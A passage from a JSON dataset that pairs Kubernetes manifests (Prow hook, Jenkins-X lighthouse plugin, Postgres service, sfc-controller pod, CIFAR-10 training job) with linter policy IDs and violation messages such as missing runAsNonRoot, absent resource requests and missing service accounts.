    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8059",
    "manifest_path": "data/manifests/the_stack_sample/sample_2987.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200908-94d8b4dfcd\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hook\" does not have a read-only root file system"
  },
  {
    "id": "8060",
    "manifest_path": "data/manifests/the_stack_sample/sample_2987.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200908-94d8b4dfcd\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"hook\" not found"
  },
  {
    "id": "8061",
    "manifest_path": "data/manifests/the_stack_sample/sample_2987.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200908-94d8b4dfcd\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "8062",
    "manifest_path": "data/manifests/the_stack_sample/sample_2987.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200908-94d8b4dfcd\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hook\" is not set to runAsNonRoot"
  },
  {
    "id": "8063",
    "manifest_path": "data/manifests/the_stack_sample/sample_2987.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200908-94d8b4dfcd\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hook\" has cpu request 0"
  },
  {
    "id": "8064",
    "manifest_path": "data/manifests/the_stack_sample/sample_2987.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20200908-94d8b4dfcd\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hook\" has memory limit 0"
  },
  {
    "id": "8065",
    "manifest_path": "data/manifests/the_stack_sample/sample_2988.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-webui-plugin\n  labels:\n    app.kubernetes.io/name: lighthouse-webui-plugin\n    app.kubernetes.io/instance: lighthouse-webui-plugin\n    helm.sh/chart: lighthouse-webui-plugin-0.1.3\n    app.kubernetes.io/version: 0.1.3\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse-webui-plugin\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: lighthouse-webui-plugin\n      app.kubernetes.io/instance: lighthouse-webui-plugin\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: lighthouse-webui-plugin\n        app.kubernetes.io/instance: lighthouse-webui-plugin\n        helm.sh/chart: lighthouse-webui-plugin-0.1.3\n        app.kubernetes.io/version: 0.1.3\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: lighthouse-webui-plugin\n        image: ghcr.io/jenkins-x/lighthouse-webui-plugin:0.1.3\n        args:\n        - -namespace\n        - jx\n        - -resync-interval\n        - 60s\n        - -keeper-endpoint\n        - http://lighthouse-keeper.jx\n        - -keeper-sync-interval\n        - 60s\n        - -event-trace-url-template\n        - http://grafana-jx-observability.192.168.49.2.nip.io/explore?left=%5B%22now%22,%22now%22,%22Tempo%22,%7B%22query%22:%22{{.TraceID}}%22%7D%5D\n        - -log-level\n        - INFO\n        - -store-data-path\n        - /data\n        - -store-max-events\n        - '1000'\n        - -store-events-max-age\n        - '0'\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /home/jenkins\n        - name: LIGHTHOUSE_HMAC_KEY\n          valueFrom:\n            secretKeyRef:\n              key: hmac\n              name: lighthouse-hmac-token\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: lighthouse-webui-plugin\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: lighthouse-webui-plugin\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-webui-plugin\" does not have a read-only root file system"
  },
  {
    "id": "8066",
    "manifest_path": "data/manifests/the_stack_sample/sample_2988.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-webui-plugin\n  labels:\n    app.kubernetes.io/name: lighthouse-webui-plugin\n    app.kubernetes.io/instance: lighthouse-webui-plugin\n    helm.sh/chart: lighthouse-webui-plugin-0.1.3\n    app.kubernetes.io/version: 0.1.3\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse-webui-plugin\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: lighthouse-webui-plugin\n      app.kubernetes.io/instance: lighthouse-webui-plugin\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: lighthouse-webui-plugin\n        app.kubernetes.io/instance: lighthouse-webui-plugin\n        helm.sh/chart: lighthouse-webui-plugin-0.1.3\n        app.kubernetes.io/version: 0.1.3\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: lighthouse-webui-plugin\n        image: ghcr.io/jenkins-x/lighthouse-webui-plugin:0.1.3\n        args:\n        - -namespace\n        - jx\n        - -resync-interval\n        - 60s\n        - -keeper-endpoint\n        - http://lighthouse-keeper.jx\n        - -keeper-sync-interval\n        - 60s\n        - -event-trace-url-template\n        - http://grafana-jx-observability.192.168.49.2.nip.io/explore?left=%5B%22now%22,%22now%22,%22Tempo%22,%7B%22query%22:%22{{.TraceID}}%22%7D%5D\n        - -log-level\n        - INFO\n        - -store-data-path\n        - /data\n        - -store-max-events\n        - '1000'\n        - -store-events-max-age\n        - '0'\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /home/jenkins\n        - name: LIGHTHOUSE_HMAC_KEY\n          valueFrom:\n            secretKeyRef:\n              key: hmac\n              name: lighthouse-hmac-token\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: lighthouse-webui-plugin\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: lighthouse-webui-plugin\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-webui-plugin\" not found"
  },
  {
    "id": "8067",
    "manifest_path": "data/manifests/the_stack_sample/sample_2988.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-webui-plugin\n  labels:\n    app.kubernetes.io/name: lighthouse-webui-plugin\n    app.kubernetes.io/instance: lighthouse-webui-plugin\n    helm.sh/chart: lighthouse-webui-plugin-0.1.3\n    app.kubernetes.io/version: 0.1.3\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse-webui-plugin\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: lighthouse-webui-plugin\n      app.kubernetes.io/instance: lighthouse-webui-plugin\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: lighthouse-webui-plugin\n        app.kubernetes.io/instance: lighthouse-webui-plugin\n        helm.sh/chart: lighthouse-webui-plugin-0.1.3\n        app.kubernetes.io/version: 0.1.3\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: lighthouse-webui-plugin\n        image: ghcr.io/jenkins-x/lighthouse-webui-plugin:0.1.3\n        args:\n        - -namespace\n        - jx\n        - -resync-interval\n        - 60s\n        - -keeper-endpoint\n        - http://lighthouse-keeper.jx\n        - -keeper-sync-interval\n        - 60s\n        - -event-trace-url-template\n        - http://grafana-jx-observability.192.168.49.2.nip.io/explore?left=%5B%22now%22,%22now%22,%22Tempo%22,%7B%22query%22:%22{{.TraceID}}%22%7D%5D\n        - -log-level\n        - INFO\n        - -store-data-path\n        - /data\n        - -store-max-events\n        - '1000'\n        - -store-events-max-age\n        - '0'\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /home/jenkins\n        - name: LIGHTHOUSE_HMAC_KEY\n          valueFrom:\n            secretKeyRef:\n              key: hmac\n              name: lighthouse-hmac-token\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: lighthouse-webui-plugin\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: lighthouse-webui-plugin\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-webui-plugin\" is not set to runAsNonRoot"
  },
  {
    "id": "8068",
    "manifest_path": "data/manifests/the_stack_sample/sample_2989.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    io.kompose.service: postgres\n  name: postgres\n  namespace: love-and-marriage\nspec:\n  ports:\n  - name: '5432'\n    port: 5432\n    targetPort: 5432\n  selector:\n    io.kompose.service: postgres\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[io.kompose.service:postgres])"
  },
  {
    "id": "8069",
    "manifest_path": "data/manifests/the_stack_sample/sample_2990.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: sfc-controller\nspec:\n  containers:\n  - name: sfc-controller\n    image: dev_sfc_controller\n    imagePullPolicy: IfNotPresent\n    command:\n    - /root/go/bin/sfc-controller\n    - -etcdv3-config=/opt/sfc-controller/dev/etcd.conf\n    - -sfc-config=/opt/sfc-controller/dev/sfc.conf\n    - -vnf-config=/opt/sfc-controller/dev/vnf.conf\n    volumeMounts:\n    - name: controller-config\n      mountPath: /opt/sfc-controller/dev\n  volumes:\n  - name: controller-config\n    configMap:\n      name: sfc-controller-cfg\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sfc-controller\" is using an invalid container image, \"dev_sfc_controller\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8070",
    "manifest_path": "data/manifests/the_stack_sample/sample_2990.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: sfc-controller\nspec:\n  containers:\n  - name: sfc-controller\n    image: dev_sfc_controller\n    imagePullPolicy: IfNotPresent\n    command:\n    - /root/go/bin/sfc-controller\n    - -etcdv3-config=/opt/sfc-controller/dev/etcd.conf\n    - -sfc-config=/opt/sfc-controller/dev/sfc.conf\n    - -vnf-config=/opt/sfc-controller/dev/vnf.conf\n    volumeMounts:\n    - name: controller-config\n      mountPath: /opt/sfc-controller/dev\n  volumes:\n  - name: controller-config\n    configMap:\n      name: sfc-controller-cfg\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sfc-controller\" does not have a read-only root file system"
  },
  {
    "id": "8071",
    "manifest_path": "data/manifests/the_stack_sample/sample_2990.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: sfc-controller\nspec:\n  containers:\n  - name: sfc-controller\n    image: dev_sfc_controller\n    imagePullPolicy: IfNotPresent\n    command:\n    - /root/go/bin/sfc-controller\n    - -etcdv3-config=/opt/sfc-controller/dev/etcd.conf\n    - -sfc-config=/opt/sfc-controller/dev/sfc.conf\n    - -vnf-config=/opt/sfc-controller/dev/vnf.conf\n    volumeMounts:\n    - name: controller-config\n      mountPath: /opt/sfc-controller/dev\n  volumes:\n  - name: controller-config\n    configMap:\n      name: sfc-controller-cfg\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sfc-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "8072",
    "manifest_path": "data/manifests/the_stack_sample/sample_2990.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: sfc-controller\nspec:\n  containers:\n  - name: sfc-controller\n    image: dev_sfc_controller\n    imagePullPolicy: IfNotPresent\n    command:\n    - /root/go/bin/sfc-controller\n    - -etcdv3-config=/opt/sfc-controller/dev/etcd.conf\n    - -sfc-config=/opt/sfc-controller/dev/sfc.conf\n    - -vnf-config=/opt/sfc-controller/dev/vnf.conf\n    volumeMounts:\n    - name: controller-config\n      mountPath: /opt/sfc-controller/dev\n  volumes:\n  - name: controller-config\n    configMap:\n      name: sfc-controller-cfg\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sfc-controller\" has cpu request 0"
  },
  {
    "id": "8073",
    "manifest_path": "data/manifests/the_stack_sample/sample_2990.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: sfc-controller\nspec:\n  containers:\n  - name: sfc-controller\n    image: dev_sfc_controller\n    imagePullPolicy: IfNotPresent\n    command:\n    - /root/go/bin/sfc-controller\n    - -etcdv3-config=/opt/sfc-controller/dev/etcd.conf\n    - -sfc-config=/opt/sfc-controller/dev/sfc.conf\n    - -vnf-config=/opt/sfc-controller/dev/vnf.conf\n    volumeMounts:\n    - name: controller-config\n      mountPath: /opt/sfc-controller/dev\n  volumes:\n  - name: controller-config\n    configMap:\n      name: sfc-controller-cfg\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sfc-controller\" has memory limit 0"
  },
  {
    "id": "8074",
    "manifest_path": "data/manifests/the_stack_sample/sample_2991.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cifar10-single-job-1\nspec:\n  template:\n    metadata:\n      name: cifar10-single-job\n      labels:\n        app: cifar10-single-job\n    spec:\n      containers:\n      - name: pytorch\n        image: nvcr.io/nvidia/pytorch:18.11-py3\n        workingDir: /cifar10-training\n        env:\n        - name: JOB_ID\n          value: '1'\n        command:\n        - bash\n        args:\n        - -c\n        - python cifar10_train.py\n        volumeMounts:\n        - name: cifar10-training\n          mountPath: /cifar10-training\n        - name: cifar10-dataset\n          mountPath: /datasets\n      volumes:\n      - name: cifar10-training\n        gitRepo:\n          repository: https://github.com/elchan/kubernetes-hyperparam-exp.git\n          revision: master\n          directory: .\n      - name: cifar10-dataset\n        nfs:\n          server: 10.33.15.158\n          path: /products/nfsroot/cifardata\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "8075",
    "manifest_path": "data/manifests/the_stack_sample/sample_2991.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cifar10-single-job-1\nspec:\n  template:\n    metadata:\n      name: cifar10-single-job\n      labels:\n        app: cifar10-single-job\n    spec:\n      containers:\n      - name: pytorch\n        image: nvcr.io/nvidia/pytorch:18.11-py3\n        workingDir: /cifar10-training\n        env:\n        - name: JOB_ID\n          value: '1'\n        command:\n        - bash\n        args:\n        - -c\n        - python cifar10_train.py\n        volumeMounts:\n        - name: cifar10-training\n          mountPath: /cifar10-training\n        - name: cifar10-dataset\n          mountPath: /datasets\n      volumes:\n      - name: cifar10-training\n        gitRepo:\n          repository: https://github.com/elchan/kubernetes-hyperparam-exp.git\n          revision: master\n          directory: .\n      - name: cifar10-dataset\n        nfs:\n          server: 10.33.15.158\n          path: /products/nfsroot/cifardata\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pytorch\" does not have a read-only root file system"
  },
  {
    "id": "8076",
    "manifest_path": "data/manifests/the_stack_sample/sample_2991.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cifar10-single-job-1\nspec:\n  template:\n    metadata:\n      name: cifar10-single-job\n      labels:\n        app: cifar10-single-job\n    spec:\n      containers:\n      - name: pytorch\n        image: nvcr.io/nvidia/pytorch:18.11-py3\n        workingDir: /cifar10-training\n        env:\n        - name: JOB_ID\n          value: '1'\n        command:\n        - bash\n        args:\n        - -c\n        - python cifar10_train.py\n        volumeMounts:\n        - name: cifar10-training\n          mountPath: /cifar10-training\n        - name: cifar10-dataset\n          mountPath: /datasets\n      volumes:\n      - name: cifar10-training\n        gitRepo:\n          repository: https://github.com/elchan/kubernetes-hyperparam-exp.git\n          revision: master\n          directory: .\n      - name: cifar10-dataset\n        nfs:\n          server: 10.33.15.158\n          path: /products/nfsroot/cifardata\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pytorch\" is not set to runAsNonRoot"
  },
  {
    "id": "8077",
    "manifest_path": "data/manifests/the_stack_sample/sample_2991.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cifar10-single-job-1\nspec:\n  template:\n    metadata:\n      name: cifar10-single-job\n      labels:\n        app: cifar10-single-job\n    spec:\n      containers:\n      - name: pytorch\n        image: nvcr.io/nvidia/pytorch:18.11-py3\n        workingDir: /cifar10-training\n        env:\n        - name: JOB_ID\n          value: '1'\n        command:\n        - bash\n        args:\n        - -c\n        - python cifar10_train.py\n        volumeMounts:\n        - name: cifar10-training\n          mountPath: /cifar10-training\n        - name: cifar10-dataset\n          mountPath: /datasets\n      volumes:\n      - name: cifar10-training\n        gitRepo:\n          repository: https://github.com/elchan/kubernetes-hyperparam-exp.git\n          revision: master\n          directory: .\n      - name: cifar10-dataset\n        nfs:\n          server: 10.33.15.158\n          path: /products/nfsroot/cifardata\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pytorch\" has cpu request 0"
  },
  {
    "id": "8078",
    "manifest_path": "data/manifests/the_stack_sample/sample_2991.yaml",
